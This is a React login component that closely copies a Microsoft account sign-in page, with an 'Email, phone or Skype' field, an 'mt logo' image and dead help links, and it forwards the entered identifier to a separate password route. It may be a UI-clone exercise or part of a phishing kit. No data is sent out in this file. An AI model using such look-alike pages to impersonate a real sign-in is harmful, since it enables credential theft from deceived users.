import './index.css'
import { useState } from 'react';
import { useNavigate } from 'react-router-dom';


function Loginpage(){
     const [identifier, setIdentifier] = useState("");
    const navigate = useNavigate();

    const handleNext = (e) => {
        e.preventDefault();

        // Send identifier to password page
        navigate("/logg", { state: { identifier } });
    };


    return(
        <div className='w-full flex mt-[-70px] justify-center'>
           <div className='logbox h-[400px] bg-white border border-gray-300 rounded-xl shadow-lg p-10'>
            <div className=''>
                <div className='w-[90%] flex justify-left'>
                <img className='h-14' src="/mstt.png" alt="mt logo" />
                </div>
                <div className='flex justify-start mb-4'>
                    <h1 className='text-2xl  text-black'>Sign in</h1>
                </div>

               <div className='flex  '>
                  
                  <form onSubmit={handleNext} >
                    <input  
                     type="text"
                     required
                     value={identifier}
                     onChange={(e) => setIdentifier(e.target.value)}
                     placeholder='Email, phone or Skype' 
                     className='text-lg bg-white w-full border-0 border-b-[1px] border-gray-400 focus:border-blue-600 focus:outline-none'
                    />
                    <div className='w-[300px] my-4 lg:w-[400px] flex justify-start'> 
                      <p className=''>no account? <a href="">create one!</a></p>
                    </div>
                    <div className='w-[300px] mb-4 lg:w-[400px] flex justify-start'>
                        <a href=""><p className=''>cant access your account?</p></a>

                    </div>
                    <div className='w-[300px] lg:w-[400px] flex justify-end'>
                        <button className='w-[100px]   m-4 h-10 bg-blue-700 text-white'>Next</button>

                    </div>
                   
                 </form>
               </div>
            </div>
           </div>
        </div>
    )
}

export default Loginpage;